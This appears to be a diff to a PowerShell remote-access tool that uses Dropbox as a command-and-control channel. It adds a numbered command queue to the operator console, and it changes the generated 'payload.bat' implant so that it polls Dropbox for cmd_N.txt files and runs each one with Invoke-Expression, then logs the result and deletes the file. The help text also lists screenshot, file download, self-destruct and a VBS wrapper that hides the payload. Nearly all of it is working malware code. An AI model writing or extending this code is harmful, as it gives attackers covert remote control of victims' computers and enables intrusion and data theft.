@@ -19,13 +19,17 @@ function Show-Help {
     Write-Host "  profile-details  - Show details of current profile" -ForegroundColor White
     Write-Host ""
     Write-Host "  cmd              - Send a command" -ForegroundColor White
+    Write-Host "  cmd-list         - Lists all commands" -ForegroundColor White
+    Write-Host "  cmd-get          - Shows a command" -ForegroundColor White
+    Write-Host "  cmd-del          - Removes a command" -ForegroundColor White
+    Write-Host "  repo             - Downloads the whole dropbox repository" -ForegroundColor White
+    Write-Host ""
     Write-Host "  fetch            - Fetch system information" -ForegroundColor White
     Write-Host "  screenshot       - Capture a screenshot" -ForegroundColor White
     Write-Host "  tree             - Capture tree output" -ForegroundColor White
     Write-Host "  download         - Download a file" -ForegroundColor White
     Write-Host "  selfdestruct /pc - Self destruct payloads" -ForegroundColor White
     Write-Host ""
-    Write-Host "  repo             - Downloads the whole dropbox repository" -ForegroundColor White
     Write-Host "  deploy           - Create the payload" -ForegroundColor White
     Write-Host "  wrap             - Create a vbs file that hides the payload" -ForegroundColor White
     Write-Host "  init             - Create the init script" -ForegroundColor White
@@ -162,7 +166,7 @@ function Profile-List {
     Write-Host "`nProfiles:" -ForegroundColor White
     foreach ($p in $Profiles) {
         $currentIndicator = if ($CurrentProfile -and $CurrentProfile.Name -eq $p.Name) { " (current)" } else { "" }
-        Write-Host "  $($p.DisplayIndex): $($p.Name)$currentIndicator" -ForegroundColor White
+        Write-Host "  $($p.DisplayIndex): $($p.Name)$currentIndicator" -ForegroundColor DarkYellow
     }
     Write-Host ""
 }
@@ -173,10 +177,10 @@ function Profile-Details {
     if (-not $CurrentProfile) { Write-Host "No profile selected" -ForegroundColor DarkRed; return }
 
     Write-Host "`nProfile Details:" -ForegroundColor White
-    Write-Host "  Name:          $($CurrentProfile.Name)" -ForegroundColor White
-    Write-Host "  App Key:       $($CurrentProfile.AppKey)" -ForegroundColor White
-    Write-Host "  App Secret:    $($CurrentProfile.AppSecret)" -ForegroundColor White
-    Write-Host "  Refresh Token: $($CurrentProfile.RefreshToken)" -ForegroundColor White
+    Write-Host "  Name:          $($CurrentProfile.Name)" -ForegroundColor DarkYellow
+    Write-Host "  App Key:       $($CurrentProfile.AppKey)" -ForegroundColor DarkYellow
+    Write-Host "  App Secret:    $($CurrentProfile.AppSecret)" -ForegroundColor DarkYellow
+    Write-Host "  Refresh Token: $($CurrentProfile.RefreshToken)" -ForegroundColor DarkYellow
     Write-Host ""
 }
 
@@ -201,8 +205,84 @@ function Send-Command {
         $Command = $CommandString
     }
 
-    $CmdFile = "cmd.txt"
-    Set-Content -Path $CmdFile -Value $Command -Encoding UTF8
+    try {
+        Write-Host "Getting access token..." -ForegroundColor White
+
+        $tokenUri = "https://api.dropbox.com/oauth2/token"
+        $body = @{
+            grant_type = "refresh_token"
+            refresh_token = $CurrentProfile.RefreshToken
+            client_id = $CurrentProfile.AppKey
+            client_secret = $CurrentProfile.AppSecret
+        }
+
+        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
+        $accessToken = $response.access_token
+
+        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen
+
+        Write-Host "Checking existing command files..." -ForegroundColor White
+
+        $listUri = "https://api.dropboxapi.com/2/files/list_folder"
+        $listHeaders = @{
+            "Authorization" = "Bearer $accessToken"
+            "Content-Type" = "application/json"
+        }
+        $listBody = @{ path = "" } | ConvertTo-Json
+
+        $files = Invoke-RestMethod -Uri $listUri -Method Post -Headers $listHeaders -Body $listBody
+        $commandFiles = $files.entries | Where-Object { $_.name -like "cmd_*.txt" }
+
+        $maxNumber = 0
+        foreach ($file in $commandFiles) {
+            if ($file.name -match "cmd_(\d+)\.txt") {
+                $num = [int]$matches[1]
+                if ($num -gt $maxNumber) {
+                    $maxNumber = $num
+                }
+            }
+        }
+
+        $nextNumber = $maxNumber + 1
+        $newFileName = "cmd_$nextNumber.txt"
+
+        Write-Host "Uploading command as $newFileName..." -ForegroundColor White
+
+        $uploadUri = "https://content.dropboxapi.com/2/files/upload"
+        $apiArg = @{
+            path = "/$newFileName"
+            mode = "overwrite"
+            autorename = $false
+            mute = $false
+        } | ConvertTo-Json -Compress
+
+        $headers = @{
+            "Authorization" = "Bearer $accessToken"
+            "Dropbox-API-Arg" = $apiArg
+            "Content-Type" = "application/octet-stream"
+        }
+
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)
+        $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes
+
+        Write-Host "Command queued successfully as $newFileName" -ForegroundColor DarkGreen
+        Write-Host "Position: $nextNumber" -ForegroundColor White
+
+    } catch {
+        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
+        if ($_.ErrorDetails.Message) {
+            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
+        }
+    }
+
+    Write-Host ""
+}
+
+function List-Commands {
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return
+    }
 
     try {
         Write-Host "Getting access token..." -ForegroundColor White
@@ -220,25 +300,163 @@ function Send-Command {
 
         Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen
 
-        Write-Host "Uploading file..." -ForegroundColor White
+        Write-Host "Listing queued commands..." -ForegroundColor White
 
-        $uploadUri = "https://content.dropboxapi.com/2/files/upload"
+        $listUri = "https://api.dropboxapi.com/2/files/list_folder"
+        $listHeaders = @{
+            "Authorization" = "Bearer $accessToken"
+            "Content-Type" = "application/json"
+        }
+        $listBody = @{ path = "" } | ConvertTo-Json
+
+        $files = Invoke-RestMethod -Uri $listUri -Method Post -Headers $listHeaders -Body $listBody
+        $commandFiles = $files.entries | Where-Object { $_.name -like "cmd_*.txt" } | Sort-Object { 
+            if ($_.name -match "cmd_(\d+)\.txt") { [int]$matches[1] } else { 0 }
+        }
+
+        if ($commandFiles.Count -eq 0) {
+            Write-Host "No commands found" -ForegroundColor DarkYellow
+            return
+        }
+
+        Write-Host "`nCommands:" -ForegroundColor White
+
+        foreach ($file in $commandFiles) {
+            if ($file.name -match "cmd_(\d+)\.txt") {
+                $cmdNumber = $matches[1]
+                $size = "$([math]::Round($file.size / 1024.0, 2)) KB"
+                $modified = (Get-Date $file.client_modified).ToString("yyyy-MM-dd HH:mm:ss")
+                Write-Host "  Cmd $cmdNumber | $size | $modified" -ForegroundColor White
+            }
+        }
+
+        Write-Host "`nCommands in queue: $(@($commandFiles).Count)" -ForegroundColor White
+
+    } catch {
+        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
+        if ($_.ErrorDetails.Message) {
+            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
+        }
+    }
+
+    Write-Host ""
+}
+
+function Get-Command {
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return
+    }
+
+    $CommandId = Read-Host "Command number"
+
+    if (-not $CommandId -or -not ($CommandId -match '^\d+$') -or [int]$CommandId -le 0) {
+        Write-Host "Invalid command number" -ForegroundColor DarkRed
+        return
+    }
+
+    $CommandId = [int]$CommandId
+
+    try {
+        Write-Host "Getting access token..." -ForegroundColor White
+
+        $tokenUri = "https://api.dropbox.com/oauth2/token"
+        $body = @{
+            grant_type = "refresh_token"
+            refresh_token = $CurrentProfile.RefreshToken
+            client_id = $CurrentProfile.AppKey
+            client_secret = $CurrentProfile.AppSecret
+        }
+
+        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
+        $accessToken = $response.access_token
+
+        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen
+
+        $fileName = "cmd_$CommandId.txt"
+        Write-Host "Reading command from $fileName..." -ForegroundColor White
+
+        $downloadUri = "https://content.dropboxapi.com/2/files/download"
+        $apiArg = @{ path = "/$fileName" } | ConvertTo-Json -Compress
         $headers = @{
             "Authorization" = "Bearer $accessToken"
-            "Dropbox-API-Arg" = '{"path":"/cmd.txt","mode":"overwrite","autorename":false,"mute":false}'
+            "Dropbox-API-Arg" = $apiArg
             "Content-Type" = "application/octet-stream"
         }
 
-        $fileContent = Get-Content -Path $CmdFile -Raw
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
+        try {
+            $commandContent = Invoke-RestMethod -Uri $downloadUri -Method Post -Headers $headers
+            Write-Host "`n  Command $CommandId Content:" -ForegroundColor White
+            Write-Host $commandContent -ForegroundColor DarkYellow
+        } catch {
+            if ($_.Exception.Response.StatusCode -eq 409) {
+                Write-Host "Command $CommandId not found" -ForegroundColor DarkYellow
+            } else {
+                throw $_
+            }
+        }
 
-        $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes
+    } catch {
+        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
+        if ($_.ErrorDetails.Message) {
+            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
+        }
+    }
 
-        Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
-        Write-Host "Path: $($uploadResponse.path_display)" -ForegroundColor White
+    Write-Host ""
+}
 
-        Remove-Item -Path $CmdFile -Force
-        Write-Host "Local file deleted" -ForegroundColor DarkGreen
+function Delete-Command {
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return
+    }
+
+    $CommandId = Read-Host "Command number"
+    
+    if (-not $CommandId -or -not ($CommandId -match '^\d+$') -or [int]$CommandId -le 0) {
+        Write-Host "Invalid command number" -ForegroundColor DarkRed
+        return
+    }
+
+    $CommandId = [int]$CommandId
+
+    try {
+        Write-Host "Getting access token..." -ForegroundColor White
+
+        $tokenUri = "https://api.dropbox.com/oauth2/token"
+        $body = @{
+            grant_type = "refresh_token"
+            refresh_token = $CurrentProfile.RefreshToken
+            client_id = $CurrentProfile.AppKey
+            client_secret = $CurrentProfile.AppSecret
+        }
+
+        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
+        $accessToken = $response.access_token
+
+        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen
+
+        $fileName = "cmd_$CommandId.txt"
+        Write-Host "Attempting to delete $fileName..." -ForegroundColor White
+
+        $deleteUri = "https://api.dropboxapi.com/2/files/delete_v2"
+        $headers = @{
+            "Authorization" = "Bearer $accessToken"
+            "Content-Type" = "application/json"
+        }
+        $deleteBody = @{ path = "/$fileName" } | ConvertTo-Json
+
+        try {
+            $result = Invoke-RestMethod -Uri $deleteUri -Method Post -Headers $headers -Body $deleteBody
+            Write-Host "Command $CommandId deleted successfully" -ForegroundColor DarkGreen
+        } catch {
+            if ($_.Exception.Response.StatusCode -eq 409) {
+                Write-Host "Command $CommandId not found" -ForegroundColor DarkYellow
+            } else {
+                throw $_
+            }
+        }
 
     } catch {
         Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
@@ -422,7 +640,7 @@ function Repo-Download {
                     Write-Host "Failed to download $remoteItemPath`: $($_.Exception.Message)" -ForegroundColor DarkRed
                     if ($_.Exception.Response) {
                         $statusCode = $_.Exception.Response.StatusCode.value__
-                        Write-Host "HTTP Status: $statusCode" -ForegroundColor Red
+                        Write-Host "HTTP Status: $statusCode" -ForegroundColor DarkRed
                     }
                 }
 
@@ -505,7 +723,7 @@ Add-Type -AssemblyName System.Web
 `$responseTime = $responseTime
 `$pingDelay = $pingDelay
 `$computerName = `$env:COMPUTERNAME
-`$logFileName = "log_`${computerName}.txt"
+`$logFileName = "log_`$computerName.txt"
 `$lastPingTime = Get-Date
 `$startupTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 `$firstRun = `$true
@@ -552,6 +770,28 @@ function Test-AccessToken {
             return `$false
         }
         return `$true
+    }
+}
+
+function Check-DropboxFiles {
+    param(`$accessToken, `$pattern = "*.txt")
+    `$uri = "https://api.dropboxapi.com/2/files/list_folder"
+    `$headers = @{
+        Authorization = "Bearer `$accessToken"
+        "Content-Type" = "application/json"
+    }
+    `$body = @{ path = "" } | ConvertTo-Json
+    try {
+        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body
+        `$matchingFiles = `$response.entries | Where-Object { `$_.name -like `$pattern }
+        return `$matchingFiles
+    }
+    catch {
+        if (`$_.Exception.Response.StatusCode -eq 401) {
+            return `$null
+        }
+        Write-Host "Failed to check for files: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
+        return `$null
     }
 }
 
@@ -617,7 +857,7 @@ function Read-FileContent {
         return `$response
     }
     catch {
-        if (`$_.Exception.Response.StatusCode -eq 401) {
+        if (`$_.Exception.Response.StatusCode -eq 409) {
             return `$null
         }
         Write-Host "Failed to read file content: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
@@ -697,18 +937,18 @@ function Update-LastPing {
     }
 }
 
-function Process-CommandFile {
-    param(`$accessToken)
-    `$command = Read-FileContent -accessToken `$accessToken
+function Process-Command {
+    param(`$accessToken, `$fileName)
+    `$command = Read-FileContent -accessToken `$accessToken -filePath "/`$fileName"
     if (-not `$command) {
         Write-Host "No command found or error reading file" -ForegroundColor DarkRed
         return `$false
     }
     try {
-        Write-Host "Executing command: `$command" -ForegroundColor White
+        Write-Host "Executing command from `$fileName : `$command" -ForegroundColor White
         Invoke-Expression `$command
         `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        `$commandLogMessage = "# EXECUTED COMMAND ON `$(`$currentTime)`n`$(`$command)"
+        `$commandLogMessage = "# EXECUTED COMMAND FROM `$fileName ON `$(`$currentTime)`n`$(`$command)"
         `$logSuccess = Append-ToLog -accessToken `$accessToken -message `$commandLogMessage
         if (-not `$logSuccess) {
             return `$false
@@ -718,7 +958,7 @@ function Process-CommandFile {
         Write-Host "Failed to execute command: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
         return `$false
     }
-    `$deleteSuccess = Delete-File -accessToken `$accessToken
+    `$deleteSuccess = Delete-File -accessToken `$accessToken -filePath "/`$fileName"
     return `$deleteSuccess
 }
 
@@ -798,16 +1038,31 @@ while (`$true) {
     }
     try {
         Check-SelfDestruct -accessToken `$accessToken
-        `$file = Check-DropboxFile -accessToken `$accessToken -fileName "cmd.txt"
-        if (`$file) {
-            Write-Host "Found command, processing..." -ForegroundColor DarkGreen
-            `$success = Process-CommandFile -accessToken `$accessToken
-            if (-not `$success) {
-                Write-Host "Command processing failed" -ForegroundColor DarkYellow
-                `$accessToken = `$null
+        `$allFiles = Check-DropboxFiles -accessToken `$accessToken -pattern "cmd_*.txt"
+        if (`$allFiles) {
+            `$lowestNumberFile = `$null
+            `$lowestNumber = [int]::MaxValue
+            foreach (`$file in `$allFiles) {
+                if (`$file.name -match "cmd_(\d+)\.txt") {
+                    `$num = [int]`$matches[1]
+                    if (`$num -lt `$lowestNumber) {
+                        `$lowestNumber = `$num
+                        `$lowestNumberFile = `$file.name
+                    }
+                }
+            }
+            if (`$lowestNumberFile) {
+                Write-Host "Found command `$lowestNumberFile, processing..." -ForegroundColor DarkGreen
+                `$success = Process-Command -accessToken `$accessToken -fileName `$lowestNumberFile
+                if (-not `$success) {
+                    Write-Host "Command processing failed" -ForegroundColor DarkYellow
+                    `$accessToken = `$null
+                }
+            } else {
+                Write-Host "No command found, checking every `$responseTime seconds..." -ForegroundColor White
             }
         } else {
-            Write-Host "Checking every `$responseTime seconds..." -ForegroundColor White
+            Write-Host "No command found, checking every `$responseTime seconds..." -ForegroundColor White
         }
         `$currentTime = Get-Date
         if ((`$currentTime - `$lastPingTime).TotalSeconds -ge `$pingDelay) {
@@ -826,8 +1081,8 @@ while (`$true) {
     }
     Start-Sleep `$responseTime
 }
-
 "@
+
     Set-Content -Path "payload.bat" -Value $batchContent -Encoding ASCII
     Write-Host "Deployment script created as 'payload.bat'" -ForegroundColor DarkGreen
     Write-Host ""
@@ -1133,6 +1388,18 @@ while (-not $exitRequested) {
         "^(cmd|c)$" {
             Send-Command
         }
+        "^(cmd-list|c-list|c-l)$" {
+            List-Commands
+        }
+        "^(cmd-get|c-get|c-g)$" {
+            Get-Command
+        }
+        "^(cmd-del|c-del|c-d|cmd-rem|cmd-r|c-r)$" {
+            Delete-Command
+        }
+        "^(repo|repository|rep|clone)$" {
+            Repo-Download
+        }
         "^(fetch|info)$" {
             Cmd-Fetch
         }
@@ -1151,9 +1418,6 @@ while (-not $exitRequested) {
                 $targetComputer = $Args -replace '^/+', ''
             }
             Send-SelfDestruct -TargetComputer $targetComputer
-        }
-        "^(repo|repository|rep|clone)$" {
-            Repo-Download
         }
         "^(deploy|d|payload)$" {
             Deploy-Script
@@ -1181,5 +1445,3 @@ while (-not $exitRequested) {
     }
 
 }
-
-
